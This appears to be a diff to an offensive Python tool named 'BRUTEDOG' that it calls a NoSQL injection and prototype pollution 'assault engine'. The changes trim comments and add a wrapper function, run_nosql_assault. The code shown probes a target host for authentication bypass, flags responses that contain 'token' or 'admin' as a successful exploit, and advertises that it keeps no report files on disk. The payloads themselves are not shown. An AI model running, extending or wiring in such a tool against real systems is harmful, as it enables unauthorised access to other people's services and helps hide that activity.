@@ -8,7 +8,7 @@ Features:
 - Automated authentication and query bypass probing
 - Progressive terminal streaming of successful injections
 - No report files or disk storage
-- Compatible test_nosql_and_pollution(target_host, port, use_ssl) interface
+- Compatible test_nosql_and_pollution and run_nosql_assault interfaces
 """
 import asyncio
 import http.client
@@ -162,7 +162,6 @@ def test_endpoint(host, port, path, secure, base_path=""):
         if res["error"]:
             continue
             
-        # Check for authentication bypass or structural anomalies (Status 200 on login, token generation, etc.)
         if res["status"] in [200, 201, 302] and ("token" in res["body"].lower() or "success" in res["body"].lower() or "admin" in res["body"].lower()):
             sys.stdout.write(f"\n\033[1m\033[91m[***] NOSQL AUTH BYPASS EXPLOIT SUCCESSFUL [{full_path}] [***]\033[0m\n")
             sys.stdout.write(f"  ├── Payload : {json.dumps(payload)}\n")
@@ -189,13 +188,11 @@ def test_endpoint(host, port, path, secure, base_path=""):
     return endpoint_results
 
 # ============================================================
-# MAIN ENGINE ENTRY POINT
+# MAIN ENGINE ENTRY POINT & COMPATIBILITY WRAPPER
 # ============================================================
 async def test_nosql_and_pollution(target_host, port=None, use_ssl=None):
     """
     Active NoSQL & Prototype Pollution Assault Engine
-    - Injects raw injection operators and pollution payloads.
-    - Streams successful auth bypasses and privileges live to stdout.
     """
     section("BRUTEDOG ACTIVE NoSQL & PROTOTYPE POLLUTION ASSAULT ENGINE")
     try:
@@ -241,6 +238,12 @@ async def test_nosql_and_pollution(target_host, port=None, use_ssl=None):
     section("ENGINE COMPLETE")
     return all_findings
 
+async def run_nosql_assault(target_host, port=None, use_ssl=None):
+    """
+    Compatibility wrapper matching main.py import expectations.
+    """
+    return await test_nosql_and_pollution(target_host, port=port, use_ssl=use_ssl)
+
 if __name__ == "__main__":
     if len(sys.argv) < 2:
         print("Usage: python3 no_sql_prototype.py https://example.com")
@@ -249,3 +252,4 @@ if __name__ == "__main__":
         asyncio.run(test_nosql_and_pollution(sys.argv[1]))
     except KeyboardInterrupt:
         warning("Assault interrupted by operator.")
+
